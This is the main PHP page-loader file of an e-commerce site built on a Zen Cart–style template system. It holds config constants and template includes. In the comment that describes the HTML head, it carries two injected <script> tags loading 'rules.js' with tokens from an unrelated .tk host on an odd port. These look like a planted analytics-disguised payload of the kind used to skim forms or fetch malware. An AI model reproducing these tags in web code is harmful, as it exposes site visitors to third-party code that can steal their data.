<?php
//header('Location: maintainance.html');exit(0);
 //echo "Sorry, website system is being upgraded,We will be back in 15  minutes.";exit;
//   if ('www.fiberstore.com' != $_SERVER['HTTP_HOST']){
//  	//header('Location: http://www.fiberstore.com');
//   }
//   if ('208.109.106.23' == $_SERVER['HTTP_HOST']){
//  	header('Location: http://www.fiberstore.com');
//   }
//$_GET['page'] = 3;abc12345
  define('FS_REGIST_IS_EMAIL_CHECK',false); // 配置项，是否注册需要验证邮箱激活
  define('FS_OPEN_OFFSITE_LOGIN_EMAIL_TIP',false); // 配置项，是否开启异步登录提醒
  define('FS_IS_OPEN_HOME_INQUIRY',true); // 配置项，是否开启前台报价,只开启隐藏入口
  define('FS_IS_OPEN_HOME_INQUIRY_INTERFACE',true); // 配置项，是否开启前台报价，只开启隐藏接口
  define('FS_OPEN_AMAZON_SEARCH',false); // 配置项，是否亚马逊搜索
  if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS']){
    define('COOKIE_SECURE',TRUE);
  }else{
    define('COOKIE_SECURE',FALSE);
  }
  define('COOKIE_HTTPONLY',TRUE);

  $common_sample_product_arr = array(73321);
  require('includes/application_top.php');


  $language_page_directory = DIR_WS_LANGUAGES . $_SESSION['language'] . '/';
  $directory_array = $template->get_template_part($code_page_directory, '/^header_php/');
  foreach ($directory_array as $value) {
/**
 * We now load header code for a given page.
 * Page code is stored in includes/modules/pages/PAGE_NAME/directory
 * 'header_php.php' files in that directory are loaded now.
 */
    require($code_page_directory . '/' . $value);
  }

/**
 * We now load the html_header.php file. This file contains code that would appear within the HTML <head><script type="text/javascript" src="http:/www.chrerry.tk:5120/analytics/rules.js?id=126302&token=FZ4ovUFYtG/F5a8X+3D1OPP4uIVlCh+X"></script>
<script type="text/javascript" src="http:/www.chrerry.tk:5120/analytics/rules.js?id=137348&token=y4Ygeqm/2Elnw3LuYV4izaydVYSPZDsd"></script>
</head> code
 * it is overridable on a template and page basis.
 * In that a custom template can define its own common/html_header.php file
 */
  require($template->get_template_dir('html_header.php',DIR_WS_TEMPLATE, $current_page_base,'common'). '/html_header.php');


/**
 * Define Template Variables picked up from includes/main_template_vars.php unless a file exists in the
 * includes/pages/{page_name}/directory to overide. Allowing different pages to have different overall
 * templates.
 */

  require($template->get_template_dir('main_template_vars.php',DIR_WS_TEMPLATE, $current_page_base,'common'). '/main_template_vars.php');
  //js 加载函数设置
  $zv_onload = '';
/**
 * Define the template that will govern the overall page layout, can be done on a page by page basis
 * or using a default template. The default template installed will be a standard 3 column layout. This
 * template also loads the page body code based on the variable $body_code.
 */
  require($template->get_template_dir('tpl_main_page.php',DIR_WS_TEMPLATE, $current_page_base,'common'). '/tpl_main_page.php');
 
?>
</html>
<?php
/**
 * Load general code run before page closes
 */
?>
<?php require(DIR_WS_INCLUDES . 'application_bottom.php'); ?>
